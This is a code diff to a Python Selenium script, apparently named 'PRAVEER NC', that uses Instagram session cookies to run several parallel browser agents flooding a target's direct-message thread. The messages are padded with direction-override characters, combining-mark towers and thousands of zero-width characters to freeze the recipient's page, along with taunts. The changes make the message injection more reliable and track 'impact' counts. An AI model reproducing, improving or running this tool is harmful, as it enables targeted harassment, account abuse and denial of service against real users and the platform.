@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (10-AGENT BLITZ)
-# 📅 STATUS: LIVE LOGS | 5 MACHINES | RELOAD BREAKER
+# 🚀 PROJECT: PRAVEER NC (IMPACT FIX)
+# 📅 STATUS: FORCED FOCUS | LIVE LOGS | 10 AGENTS
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -20,15 +20,11 @@ START_TIME = time.time()
 COUNTER_LOCK = threading.Lock()
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-# --- LIVE LOGGING SYSTEM ---
 def live_logger():
-    """Independent thread to display real-time impact stats."""
     while True:
         elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - START_TIME))
         with COUNTER_LOCK:
             current_total = GLOBAL_SENT
-        
-        # Clean terminal-style status line
         sys.stdout.write(
             f"\r\033[1;32m[M{MACHINE_ID}] UP: {elapsed} | "
             f"TOTAL IMPACT: {current_total} | "
@@ -39,16 +35,12 @@ def live_logger():
 
 def get_reload_breaker_payload(target):
     header = "👑 PRAVEER PAPA 👑\n"
-    sub_header = f"SYSTEM ERROR: {target.upper()} HAS BEEN OWNED\n"
     direction_chaos = ("\u202E" + "\u202D") * 100 
     z_tower = "̸" * 80
     bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(3500))
-    
-    lines = [header, sub_header, bloat]
+    lines = [header, bloat]
     for _ in range(35):
         lines.append(direction_chaos + "PRAVEER_OWNZ_YOU" + z_tower)
-    lines.append(bloat + "\n🛑 PAGE UNRESPONSIVE 🛑")
-    
     return "\n".join(lines)
 
 def get_driver(agent_id):
@@ -57,21 +49,42 @@ def get_driver(agent_id):
     chrome_options.add_argument("--no-sandbox") 
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--disable-gpu")
+    # Forces a large screen so the chat box isn't hidden
+    chrome_options.add_argument("--window-size=1920,1080")
     temp_dir = os.path.join(tempfile.gettempdir(), f"m{MACHINE_ID}_a{agent_id}_{int(time.time())}")
     chrome_options.add_argument(f"--user-data-dir={temp_dir}")
     return webdriver.Chrome(options=chrome_options)
 
 def adaptive_inject(driver, text):
     try:
-        box = driver.find_element(By.XPATH, "//div[@role='textbox']")
-        driver.execute_script("""
-            var el = arguments[0];
-            el.focus();
-            document.execCommand('insertText', false, arguments[1]);
-            el.dispatchEvent(new Event('input', { bubbles: true }));
-        """, box, text)
-        box.send_keys(Keys.ENTER)
-        return True
+        # Targeting multiple possible selectors for the IG message box
+        selectors = [
+            "//div[@role='textbox'][@aria-label='Message']",
+            "//div[@contenteditable='true']",
+            "//textarea"
+        ]
+        box = None
+        for sel in selectors:
+            try:
+                box = driver.find_element(By.XPATH, sel)
+                if box: break
+            except: continue
+        
+        if box:
+            # Force view and click
+            driver.execute_script("arguments[0].scrollIntoView(true);", box)
+            driver.execute_script("arguments[0].click();", box)
+            # Hard injection
+            driver.execute_script("""
+                var el = arguments[0];
+                el.focus();
+                document.execCommand('insertText', false, arguments[1]);
+                el.dispatchEvent(new Event('input', { bubbles: true }));
+            """, box, text)
+            time.sleep(0.1)
+            box.send_keys(Keys.ENTER)
+            return True
+        return False
     except: return False
 
 def run_life_cycle(agent_id, cookie, target):
@@ -85,9 +98,9 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
             driver.refresh()
-            time.sleep(5)
+            time.sleep(8) # Increased wait for GH Action lag
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(6)
+            time.sleep(10) # Heavy wait to ensure DM loads
 
             while (time.time() - session_start) < SESSION_LIMIT:
                 payload = get_reload_breaker_payload(os.getenv("TARGET_NAME", "Target"))
@@ -106,10 +119,7 @@ def main():
     raw_url = os.environ.get("GROUP_URL", "").strip()
     target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
     
-    # Start the Live Stats thread
     threading.Thread(target=live_logger, daemon=True).start()
-    
-    print(f"\n🚀 MACHINE {MACHINE_ID} DEPLOYED | 2 AGENTS STARTING...\n")
     
     with ThreadPoolExecutor(max_workers=THREADS) as executor:
         for i in range(THREADS):
